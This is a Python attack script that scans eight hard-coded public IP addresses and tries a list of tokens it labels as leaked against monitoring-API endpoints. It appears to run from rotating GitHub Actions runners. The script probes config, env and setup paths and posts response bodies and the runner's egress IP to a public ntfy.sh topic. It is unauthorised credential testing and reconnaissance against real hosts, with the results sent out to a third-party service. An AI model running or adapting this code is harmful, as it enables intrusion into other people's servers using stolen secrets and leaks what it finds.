#!/usr/bin/env python3
# i45457 :3001 server-monitor agent token-auth probe from fresh GHA runner EIP.
import os, sys, socket, ssl, json, re, time, urllib.request, urllib.parse

JOB = os.environ.get("JOB", "0")
TOPIC = os.environ.get("TOPIC", "i45457-d4f1")
# monitor-node hosts (fact5223) + intent targets
NODES = ["40.160.68.125","40.160.14.146","40.160.14.77","40.160.7.76",
         "15.204.217.98","40.160.50.80","40.160.21.1","40.160.69.132"]
PORTS = [3001,3000,8787,8000,443,80,22]
# leaked monitor tokens (fact5223) -- try all against all hosts
TOKENS = ["haochi1hao","test-haaochimysql","test-clickhouse","haochigyy",
          "yibumysql","yibuapigyy","local",""]

def log(*a): print(" ".join(str(x) for x in a), flush=True)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3800):
        try:
            req = urllib.request.Request("https://ntfy.sh/"+TOPIC,
                data=((("[j%s %d] " % (JOB, i//3800+1)) + text[i:i+3800]).encode("utf-8","replace")),
                method="POST", headers={"Title": ("i45457-"+tag)[:60]})
            urllib.request.urlopen(req, timeout=12).read()
        except Exception as e:
            log("NTFYERR", str(e)[:80])

def egress():
    for u in ("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
        try: return urllib.request.urlopen(u, timeout=10).read().decode().strip()
        except Exception: pass
    return "ERR"

def tcp_open(ip, port, t=3.0):
    try:
        s = socket.create_connection((ip, port), timeout=t); s.close(); return True
    except Exception: return False

def http_req(ip, port, path="/", host=None, tls=False, timeout=9, method="GET", body=None, extra=None):
    s=None
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        if tls:
            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            s=ctx.wrap_socket(s, server_hostname=host or ip)
        h = host or ip
        hdr = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 probe\r\nAccept: */*\r\nConnection: close\r\n" % (method,path,h)
        if extra:
            for k,v in extra.items(): hdr += "%s: %s\r\n"%(k,v)
        if body is not None:
            b = body.encode() if isinstance(body,str) else body
            hdr += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n"%len(b)
            raw = hdr.encode()+b"\r\n"+b
        else:
            raw = hdr.encode()+b"\r\n"
        s.sendall(raw)
        data=b""
        while True:
            ch=s.recv(8192)
            if not ch: break
            data+=ch
            if len(data)>90000: break
        head,_,bd = data.partition(b"\r\n\r\n")
        lines=head.decode("latin-1","replace").split("\r\n")
        status=0
        try: status=int(lines[0].split()[1])
        except Exception: pass
        headers={}
        for ln in lines[1:]:
            if ":" in ln:
                k,v=ln.split(":",1); headers[k.strip().lower()]=v.strip()
        return {"status":status,"headers":headers,"body":bd,"bodylen":len(bd)}
    except Exception as e:
        return {"status":0,"headers":{},"body":b"","bodylen":0,"err":str(e)[:80]}
    finally:
        try:
            if s: s.close()
        except Exception: pass

def snip(body,n=140):
    try: return body[:n].decode("utf-8","replace").replace("\n"," ").replace("\r"," ").strip()
    except Exception: return ""

def job_nodes():
    # each job tests exactly one node from its own fresh EIP; 2 jobs per node via matrix
    order = [NODES[int(JOB) % len(NODES)]]
    for ip in order:
        opened=[]
        for p in PORTS:
            if tcp_open(ip,p): opened.append(p)
        log("OPEN %s %s"%(ip,opened))
        if not opened: 
            send("probe","%s egress=%s NO-PORTS-OPEN"%(ip,EGRESS)); continue
        send("probe","%s egress=%s open=%s"%(ip,EGRESS,opened))
        for port in opened:
            if port in (3001,3000,8787,8000):
                probe_monitor(ip,port,opened)

def probe_monitor(ip,port,opened):
    # fingerprint
    r = http_req(ip,port,"/api/status")
    log("STATUS %s:%s -> %s len=%d"%(ip,port,r["status"],r["bodylen"]))
    if r["status"]==200:
        send("status","%s:%s /api/status %s"%(ip,port,snip(r["body"],240)))
    # monitor metrics with each token
    for tok in TOKENS:
        # 1) Bearer header
        r = http_req(ip,port,"/api/monitor/metrics?disk_path=/",extra={"Authorization":"Bearer "+tok})
        if r["status"] not in (404,0):
            send("mon","%s:%s Bearer[%s] -> %s len=%d %s"%(ip,port,tok[:20],r["status"],r["bodylen"],snip(r["body"],300)))
            log("MON B %s:%s [%s] %s %s"%(ip,port,tok[:20],r["status"],snip(r["body"],120)))
        # 2) ?token=
        r2 = http_req(ip,port,"/api/monitor/metrics?disk_path=/&token="+urllib.parse.quote(tok))
        if r2["status"] not in (404,0):
            send("mon","%s:%s ?token[%s] -> %s len=%d %s"%(ip,port,tok[:20],r2["status"],r2["bodylen"],snip(r2["body"],300)))
        # 3) X-Token header
        r3 = http_req(ip,port,"/api/monitor/metrics?disk_path=/",extra={"X-Token":tok,"X-Monitor-Token":tok})
        if r3["status"] not in (404,0):
            send("mon","%s:%s XTok[%s] -> %s len=%d %s"%(ip,port,tok[:20],r3["status"],r3["bodylen"],snip(r3["body"],300)))
    # other monitor-adjacent endpoints if it looks like new-api
    for ep in ["/api/monitor","/api/monitor/env","/api/monitor/config","/api/setup","/api/uptime/status"]:
        r = http_req(ip,port,ep)
        if r["status"] not in (0,404):
            send("ep","%s:%s %s -> %s len=%d %s"%(ip,port,ep,r["status"],r["bodylen"],snip(r["body"],200)))

EGRESS=""
if __name__=="__main__":
    EGRESS=egress()
    log("EGRESS",EGRESS,"JOB",JOB)
    send("boot","job=%s egress=%s"%(JOB,EGRESS))
    job_nodes()
    send("done","job=%s finished egress=%s"%(JOB,EGRESS))
